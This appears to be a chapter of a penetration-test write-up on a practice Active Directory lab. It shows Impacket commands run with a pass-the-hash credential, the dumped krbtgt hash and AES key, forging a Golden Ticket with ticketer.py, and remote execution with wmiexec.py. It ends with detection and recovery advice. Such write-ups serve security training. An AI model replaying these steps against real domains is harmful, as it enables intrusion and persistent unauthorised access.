# Golden Ticket and Cross-Domain Trust Abuse

## Objective

This phase tested whether the `krbtgt` material recovered from the child domain could be used to forge a valid **Kerberos Ticket-Granting Ticket (TGT)**, maintain domain access, and evaluate the potential impact of the trust relationship with the parent domain.

## Starting position

- Domain Admin level access in `north.sevenkingdoms.local`
- The child-domain SID
- The child-domain `krbtgt` key material
- Knowledge of the parent domain and its SID

## Why `krbtgt` compromise matters

The `krbtgt` account is used by the **Key Distribution Center** to protect Kerberos TGTs.

Access to its cryptographic key allows an attacker to create tickets tha tappear to have been issued by the domain.

This is different from compromising one administrator password. 

A forged ticket can be generted for an arbitrary username and group membership and may continue to work until the `krbtgt` keys are rotated correctly!

## Required domain informaiton

Impacket's `lookupsid.py` was used to confirm the relevant SIDs.

```bash
lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.22
```

The result is:

```bash
[*] Brute forcing SIDs at 10.4.10.22
[*] StringBinding ncacn_np:10.4.10.22[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3779674392-1109536343-705869415
500: CASTELBLACK\Administrator (SidTypeUser)
501: CASTELBLACK\Guest (SidTypeUser)
503: CASTELBLACK\DefaultAccount (SidTypeUser)
504: CASTELBLACK\WDAGUtilityAccount (SidTypeUser)
513: CASTELBLACK\None (SidTypeGroup)
1000: CASTELBLACK\localuser (SidTypeUser)
1001: CASTELBLACK\SQLServer2005SQLBrowserUser$CASTELBLACK (SidTypeAlias)
```

The domain SID and target group RIDs are needed for the ticket analysis.

### Child Domain SID

```bash
lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.11
```

Result:
```bash
[*] Domain SID is: S-1-5-21-58534182-3680670537-1634125476
500: NORTH\Administrator (SidTypeUser)
501: NORTH\Guest (SidTypeUser)
502: NORTH\krbtgt (SidTypeUser)
512: NORTH\Domain Admins (SidTypeGroup)
513: NORTH\Domain Users (SidTypeGroup)
514: NORTH\Domain Guests (SidTypeGroup)
515: NORTH\Domain Computers (SidTypeGroup)
516: NORTH\Domain Controllers (SidTypeGroup)
517: NORTH\Cert Publishers (SidTypeAlias)
520: NORTH\Group Policy Creator Owners (SidTypeGroup)
521: NORTH\Read-only Domain Controllers (SidTypeGroup)
522: NORTH\Cloneable Domain Controllers (SidTypeGroup)
525: NORTH\Protected Users (SidTypeGroup)
526: NORTH\Key Admins (SidTypeGroup)
553: NORTH\RAS and IAS Servers (SidTypeAlias)
571: NORTH\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTH\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTH\localuser (SidTypeUser)
1001: NORTH\WINTERFELL$ (SidTypeUser)
1102: NORTH\DnsAdmins (SidTypeAlias)
1103: NORTH\DnsUpdateProxy (SidTypeGroup)
1104: NORTH\SEVENKINGDOMS$ (SidTypeUser)
1105: NORTH\CASTELBLACK$ (SidTypeUser)
1106: NORTH\Stark (SidTypeGroup)
1107: NORTH\Night Watch (SidTypeGroup)
1108: NORTH\Mormont (SidTypeGroup)
1109: NORTH\AcrossTheSea (SidTypeAlias)
1110: NORTH\arya.stark (SidTypeUser)
1111: NORTH\eddard.stark (SidTypeUser)
1112: NORTH\catelyn.stark (SidTypeUser)
1113: NORTH\robb.stark (SidTypeUser)
1114: NORTH\sansa.stark (SidTypeUser)
1115: NORTH\brandon.stark (SidTypeUser)
1116: NORTH\rickon.stark (SidTypeUser)
1117: NORTH\hodor (SidTypeUser)
1118: NORTH\jon.snow (SidTypeUser)
1119: NORTH\samwell.tarly (SidTypeUser)
1120: NORTH\jeor.mormont (SidTypeUser)
1121: NORTH\sql_svc (SidTypeUser)
```

### Parent Domain SID

```bash
lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.10

# Result
498: SEVENKINGDOMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SEVENKINGDOMS\Administrator (SidTypeUser)
501: SEVENKINGDOMS\Guest (SidTypeUser)
502: SEVENKINGDOMS\krbtgt (SidTypeUser)
512: SEVENKINGDOMS\Domain Admins (SidTypeGroup)
513: SEVENKINGDOMS\Domain Users (SidTypeGroup)
514: SEVENKINGDOMS\Domain Guests (SidTypeGroup)
515: SEVENKINGDOMS\Domain Computers (SidTypeGroup)
516: SEVENKINGDOMS\Domain Controllers (SidTypeGroup)
517: SEVENKINGDOMS\Cert Publishers (SidTypeAlias)
518: SEVENKINGDOMS\Schema Admins (SidTypeGroup)
519: SEVENKINGDOMS\Enterprise Admins (SidTypeGroup)
520: SEVENKINGDOMS\Group Policy Creator Owners (SidTypeGroup)
521: SEVENKINGDOMS\Read-only Domain Controllers (SidTypeGroup)
522: SEVENKINGDOMS\Cloneable Domain Controllers (SidTypeGroup)
525: SEVENKINGDOMS\Protected Users (SidTypeGroup)
526: SEVENKINGDOMS\Key Admins (SidTypeGroup)
527: SEVENKINGDOMS\Enterprise Key Admins (SidTypeGroup)
553: SEVENKINGDOMS\RAS and IAS Servers (SidTypeAlias)
571: SEVENKINGDOMS\Allowed RODC Password Replication Group (SidTypeAlias)
572: SEVENKINGDOMS\Denied RODC Password Replication Group (SidTypeAlias)
1000: SEVENKINGDOMS\localuser (SidTypeUser)
1001: SEVENKINGDOMS\KINGSLANDING$ (SidTypeUser)
1102: SEVENKINGDOMS\DnsAdmins (SidTypeAlias)
1103: SEVENKINGDOMS\DnsUpdateProxy (SidTypeGroup)
1104: SEVENKINGDOMS\NORTH$ (SidTypeUser)
1105: SEVENKINGDOMS\ESSOS$ (SidTypeUser)
1106: SEVENKINGDOMS\Lannister (SidTypeGroup)
1107: SEVENKINGDOMS\Baratheon (SidTypeGroup)
1108: SEVENKINGDOMS\Small Council (SidTypeGroup)
1109: SEVENKINGDOMS\DragonStone (SidTypeGroup)
1110: SEVENKINGDOMS\KingsGuard (SidTypeGroup)
1111: SEVENKINGDOMS\DragonRider (SidTypeGroup)
1112: SEVENKINGDOMS\AcrossTheNarrowSea (SidTypeAlias)
1113: SEVENKINGDOMS\tywin.lannister (SidTypeUser)
1114: SEVENKINGDOMS\jaime.lannister (SidTypeUser)
1115: SEVENKINGDOMS\cersei.lannister (SidTypeUser)
1116: SEVENKINGDOMS\tyron.lannister (SidTypeUser)
1117: SEVENKINGDOMS\robert.baratheon (SidTypeUser)
1118: SEVENKINGDOMS\joffrey.baratheon (SidTypeUser)
1119: SEVENKINGDOMS\renly.baratheon (SidTypeUser)
1120: SEVENKINGDOMS\stannis.baratheon (SidTypeUser)
1121: SEVENKINGDOMS\petyer.baelish (SidTypeUser)
1122: SEVENKINGDOMS\lord.varys (SidTypeUser)
1123: SEVENKINGDOMS\maester.pycelle (SidTypeUser)
```

So, now the required values are:
```text
Child-domain SID "NORTH_DOMAIN_SID": S-1-5-21-58534182-3680670537-1634125476

Parent-domain SID: "SEVENKINGDOMS_DOMAIN_SID": S-1-5-21-3848810514-1890589760-83533814

KRBTGT hash: 34b24f1a67d914d8ef876f8bd02f3f0b

KRBTGT AES: badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580
```

## Validated child-domain Golden Ticket

A Golden Ticket was generated for an existing child-domain accoutn with a valid RID:

```bash
ticketer.py -aesKey badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580 -domain-sid S-1-5-21-58534182-3680670537-1634125476 -extra-pac -domain north.sevenkingdoms.local -user-id 1111 eddard.stark
```

The resulting credential cache was loaded:

```bash
export KRB5CCNAME=/home/kali/eddard.stark.ccache
```

Kerberos authentication was then validated against `WINTERFELL`:

```bash
wmiexec.py -k -no-pass north.sevenkingdoms.local/eddard.stark@winterfell.north.sevenkingdoms.local
```

## Related cross-domain compromise

A separate cross-domain compromise was later validated through **unconstrained delegation**, where a parent-domain controller's TGT was captured and used to extract parent-domain credentials.

That path is documented in [Kerberos delegation](07-kerberos-delegation.md) and should not be confused with the unvalidated cross-domain Golden Ticket.

## Result

The assessment confirmed that:

- The child-domain `krbtgt` material was compromised
- A forged child-domain TGT could be generated and used successfully
- The parent-domain trust relationship created a potential escalation path
- Creation and usage of the Golden Ticket made it possible to maintain access

## Security Impact

A validated Golden Ticket provides domain-level persistence that is independent of the compromised user's current password. 

Ordinary password resets do not remove the attacker's ability to forge new tickets while the `krbtgt` key remains valid.

If SID filtering and trust protections allow privileged extra SIDs to cross a trust boundary, the impact can extend beyond the child domain into the parent forest.

## Detection opportunities

Golden Tickets can be difficult to identify solely from one event. Useful signals include:

- Kerberos tickets with unusual lifetimes or encryption characteristics
- Ticket use for usernames that do not exist or are disabled
- Privileged access without a corresponding normal authentication sequence
- Mismatches between account attributes and group membership represented in the ticket
- Service-ticket activity from systems or accoutns that do not normally request it
- Evidence of prior access to domain-controller credential material

## Containment and recovery

If `krbtgt` material is exposed:

1. Treat the domain as compromised and investigate how domain-controller credential access occurred
2. Rotate other exposed privileged credentials
3. Reset the `krbtgt` password twice, allowing domain replication to complete between resets
4. Review trust relationships, SID filtering, and privileged cross-domain group membership
5. Hunt for forged-ticket activity and persistence on systems accessed during the compromise
6. Restrict where privileged accounts may log on to reduce future credential exposure

## MITRE ATT&CK mapping

- `T1558.001` - Golden Ticket
- `T1550.003` - Pass the Ticket
- `T1134.005` - SID-History Injection / Extra SID abuse context

## Key takeaway

The child-domain Golden Ticket was a confirmed result and demonstrates why `krbtgt` compromise is a domain-recovery event.

## Navigation

[Previous: Privilege escalation and domain compromise](04-privilege-escalation-and-domain-compromise.md) | [Assessment index](../README.md) | [Next: Active Directory Certificate Services](06-adcs/README.md)